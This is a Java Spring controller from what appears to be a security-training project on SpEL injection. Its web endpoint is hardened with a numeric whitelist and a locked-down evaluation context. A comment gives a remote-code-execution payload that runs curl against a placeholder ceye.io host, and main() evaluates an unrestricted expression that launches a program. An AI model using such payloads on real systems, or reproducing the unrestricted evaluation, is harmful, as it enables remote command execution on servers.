package org.joychou.controller;

import org.springframework.web.util.HtmlUtils;
import org.springframework.expression.ConstructorResolver;
import org.springframework.expression.EvaluationException;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.MethodResolver;
import org.springframework.expression.PropertyAccessor;
import org.springframework.expression.TypeLocator;
import org.springframework.expression.spel.SpelEvaluationException;
import org.springframework.expression.spel.SpelMessage;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.ArrayList;
import java.util.regex.Pattern;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    private static final Pattern SAFE_EXPRESSION = Pattern.compile("^[0-9+\\-*/%().<>=!\\s]+$");

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        // Only arithmetic / comparison over numeric literals is accepted: no identifiers, quotes,
        // '#', '@', '$' or '{', so nothing but numbers and operators ever reaches the parser.
        if (expression == null || expression.length() > 200 || !SAFE_EXPRESSION.matcher(expression).matches()) {
            return "Bad boy. I got u.";
        }
        ExpressionParser parser = new SpelExpressionParser();
        // SimpleEvaluationContext needs Spring 4.3.15+; this project is on 4.3.6, so lock down a
        // StandardEvaluationContext instead: no types (T(..)), no constructors, no method calls,
        // no property/bean access. Only literals and operators remain evaluable.
        StandardEvaluationContext context = new StandardEvaluationContext();
        context.setTypeLocator(new TypeLocator() {
            @Override
            public Class<?> findType(String typeName) throws EvaluationException {
                throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
            }
        });
        context.setConstructorResolvers(new ArrayList<ConstructorResolver>());
        context.setMethodResolvers(new ArrayList<MethodResolver>());
        context.setPropertyAccessors(new ArrayList<PropertyAccessor>());
        return HtmlUtils.htmlEscape(String.valueOf(parser.parseExpression(expression).getValue(context)));
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

